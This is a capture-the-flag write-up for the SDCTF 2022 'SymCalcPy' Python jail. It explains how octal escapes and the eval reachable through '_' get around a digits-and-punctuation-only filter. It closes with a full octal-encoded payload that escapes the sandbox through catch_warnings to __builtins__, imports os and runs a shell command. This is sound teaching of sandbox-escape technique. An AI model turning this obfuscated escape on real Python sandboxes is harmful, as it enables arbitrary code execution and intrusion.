# SymCalcPy

```
score: 220
solved: xx/27
difficulty: medium
tags: jail, python
```

## Problem

Welcome to SymCalc, the most secure calculator ever. Only punctuation and digits allowed!
Connect via
nc symcalc.sdc.tf 1337
Source code
symcalc.py

https://github.com/acmucsd/sdctf-2022/

## Got the flag

Only punctuation and number, then how to write code, e.g to open or to import os?

we did a search and found

[HELP] Python code execution without letters: LiveOverflow
https://www.reddit.com/r/LiveOverflow/comments/97b0hw/help_python_code_execution_without_letters/

The answer is to use octal to write character

```py
>>> "\077"
'?'
```

so we can write code without letters.

Then how to run code?

Reading the symcalc.py, it uses `code` standard library,

```
from code import InteractiveConsole

...
sc.push(fav_builtin)
```

reading [doc of `code`](https://docs.python.org/3/library/code.html), push would eval a function before running our code, it returns `eval` function.
As Python interpreter use `_` to refer to last calculated result, we can use `_(our_encoded_octal_string)` to run arbitrary code.

Encode to octal
```py
print(''.join(['\\' + oct(ord(c))[2:] for c in 'cat flag.txt']))
```

Solve

```
_("\050\050\133\170\040\146\157\162\040\170\040\151\156\040\050\061\051\056\137\137\143\154\141\163\163\137\137\056\137\137\142\141\163\145\137\137\056\137\137\163\165\142\143\154\141\163\163\145\163\137\137\050\051\040\151\146\040\170\056\137\137\156\141\155\145\137\137\040\075\075\040\047\143\141\164\143\150\137\167\141\162\156\151\156\147\163\047\135\133\060\135\050\051\056\137\155\157\144\165\154\145\056\137\137\142\165\151\154\164\151\156\163\137\137\051\051\133\047\137\137\151\155\160\157\162\164\137\137\047\135\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\143\141\164\40\146\154\141\147\56\164\170\164\047\051")
```

we got the flag.
